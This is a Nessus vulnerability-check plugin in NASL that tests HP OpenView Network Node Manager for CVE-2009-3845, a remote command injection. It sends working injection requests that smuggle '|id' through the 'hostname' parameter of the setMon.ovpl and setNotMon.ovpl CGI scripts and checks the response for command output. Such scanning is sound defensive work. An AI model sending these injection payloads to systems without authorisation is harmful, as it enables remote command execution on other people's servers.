#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(43155);
  script_version("$Revision: 1.15 $");

  script_cve_id('CVE-2009-3845');
  script_bugtraq_id(37300);
  script_osvdb_id(60923);

  script_name(english:"HP OpenView Network Node Manager Multiple Scripts hostname Parameter Remote Command Execution");
  script_summary(english:"Checks for multiple remote command execution vulnerabilities in HP OpenView NNM");

  script_set_attribute(attribute:"synopsis",value:
"The remote web server contains multiple CGI scripts that allow
execution of arbitrary commands."
  );
  script_set_attribute(attribute:"description",value:
"The remote version of HP OpenView Network Node Manager fails to
sanitize user-supplied input to the 'hostname' parameter used in the
'setMon.ovpl', 'setNotMon.ovpl', and 'ifMgrp.ovpl' scripts before
using it to run a command.  By leveraging these flaws, an
unauthenticated, remote attacker may be able to execute arbitrary
commands on the remote host within the context of the affected web
server userid. 

Note that the installed version of HP OpenView Network Node Manager is
potentially affected by multiple other issues, though Nessus has not
tested for these."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.securityfocus.com/archive/1/508345/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.securityfocus.com/advisories/18537"
  );
   # http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01950877
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?422f4693"
  );
  script_set_attribute(
    attribute:"solution",
    value:
"Apply the appropriate patch referenced in the vendor's advisory
above."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/12/09"
  );
  script_set_attribute(
    attribute:"patch_publication_date",
    value:"2009/11/26"
  );
  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/12/14"
  );
 script_cvs_date("$Date: 2015/01/15 16:37:16 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:openview_network_node_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 3443);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:3443);

os = get_kb_item("Host/OS");
if (!isnull(os) && "Windows" >< os)
{
  exit(0, "The remote host is not affected by the vulnerability because it is running Windows.");
}

cmd = "id";
rand = unixtime();
cmd_pats = make_array(
  "/setMon.ovpl?Action=continue&hostname="+SCRIPT_NAME+"-"+rand+"|"+cmd,
  "<H2>Set Node to Monitored <BR> "+SCRIPT_NAME+"-"+rand+"|"+cmd,
  "/setNotMon.ovpl?Action=continue&hostname="+SCRIPT_NAME+"-"+rand+"|"+cmd,
  "<H2>Set Node to Not Monitored <BR> "+SCRIPT_NAME+"-"+rand+"|"+cmd
);

foreach exploit (keys(cmd_pats))
{
  http_check_remote_code(
    port:port,
    unique_dir:"/OvCgi/ifaceMgr",
    check_request:exploit,
    check_result:"uid=[0-9]+.*gid=[0-9]+.*",
    extra_check:cmd_pats[exploit],
    command:cmd
  );
}
